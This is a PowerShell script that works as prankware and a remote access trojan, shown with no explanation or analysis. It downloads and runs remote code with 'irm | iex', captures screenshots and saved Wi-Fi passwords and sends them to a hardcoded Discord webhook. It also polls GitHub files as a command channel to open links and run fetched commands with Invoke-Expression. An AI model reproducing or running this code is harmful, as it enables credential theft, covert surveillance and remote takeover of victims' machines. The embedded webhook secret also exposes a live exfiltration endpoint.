Set-Location $env:Temp; Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/sound1.wav -O sound1.wav
Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/sound2.wav -O sound2.wav
Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/sound3.wav -O sound3.wav

irm https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/add_script.txt | iex

function Upload-Discord {
 
  [CmdletBinding()]
  param (
      [parameter(Position=0,Mandatory=$False)]
      [string]$file,
      [parameter(Position=1,Mandatory=$False)]
      [string]$text
  )
 
  $hookurl = "https://discord.com/api/webhooks/1117010204882649108/P17xsDKiBxsPNV0G49brrLwtwkHU-haM3iOLQJmp8c9dMQKve_e4vWvR6F966DiiYGOB"
 
  $Body = @{
    'username' = $env:username
    'content' = $text
  }
 
  if (-not ([string]::IsNullOrEmpty($text))){
  Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
 
  if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
  }


$code = @' 
using System.Runtime.InteropServices; 
namespace Win32{ 
    
     public class Wallpaper{ 
        [DllImport("user32.dll", CharSet=CharSet.Auto)] 
         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; 
         
         public static void SetWallpaper(string thePath){ 
            SystemParametersInfo(20,0,thePath,3); 
         }
    }
 } 
'@
add-type $code

Add-Type -AssemblyName System.Windows.Forms,System.Drawing

$screens = [Windows.Forms.Screen]::AllScreens

$top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
$left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
$right  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
$bottom = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum

$bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $right, $bottom)
$bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
$graphics = [Drawing.Graphics]::FromImage($bmp)

function save-screen {
$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
$bmp.Save("$env:temp\test.png")
Upload-Discord -file $env:temp\test.png | Out-null
}

function mouse-shake($i) {
$Pos = [System.Windows.Forms.Cursor]::Position
$x = $pos.X
$y = $pos.Y
foreach ($o in 1..$i){[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
Sleep -Milliseconds 350
}
}

function set-vol($n1){
[audio]::Mute = $false
[audio]::Volume  = $n1 / 100
}

function set-wall($imgPath){
[Win32.Wallpaper]::SetWallpaper($imgPath)
}

function download($link1){
Invoke-WebRequest $link1 -O img.jpg
}

function sound($y){
$Player = New-Object System.Media.SoundPlayer $y
$player.play()
}

function pass-grab{
$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Содержимое ключа\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
$wifiProfiles > $env:TEMP/--wifi-pass.txt
Upload-Discord -file "$env:TEMP/--wifi-pass.txt"
}

$wshell = New-Object -ComObject wscript.shell;
function yut {
$wshell.SendKeys('{ESC}')
[system.Diagnostics.Process]::Start("chrome",$link) | Out-Null
sleep 2
$wshell.SendKeys('{F11}')
sleep -Seconds 9
$wshell.SendKeys('f')
sleep 1
$wshell.SendKeys('{up}')
sleep 1
$wshell.SendKeys('{up}')
}
$a = $True
$b = $True
while(1){
$response = Invoke-WebRequest -Uri "https://github.com/FraitRed/g/blob/main/213" -UseBasicParsing
$response.Content -match 'rawLines":..(.*?)..,' | Out-Null
$Matches[1] = $Matches[1] -replace '\\',''
if(($Matches[1] -eq 1) -and (!$a)){
$a = $True
}
if(($Matches[1] -eq 0) -and ($a)){
$l = Invoke-WebRequest -Uri "https://github.com/FraitRed/g/blob/main/link" -UseBasicParsing
$l.Content -match 'rawLines":..(.*?)..,' | Out-Null
$Matches[1] = $Matches[1] -replace '\\',''
$link = $Matches[1]
yut
$a = $False
}
$p = Invoke-WebRequest -Uri "https://github.com/FraitRed/g/blob/main/312" -UseBasicParsing
$p.Content -match 'rawLines":..(.*?)..,' | Out-Null
$Matches[1] = $Matches[1] -replace '\\',''
if(($Matches[1] -eq 0) -and (!$b)){
$b = $True
}
if(($Matches[1] -eq 1) -and ($b)){
$c = Invoke-WebRequest -Uri "https://github.com/FraitRed/g/blob/main/command" -UseBasicParsing
$c.Content -match 'rawLines":..(.*?)..,.stylingDirectives' | Out-Null
$Matches[1] = $Matches[1] -replace '\\',''
Invoke-Expression $Matches[1]
$b = $False
}
sleep -Seconds 3
}
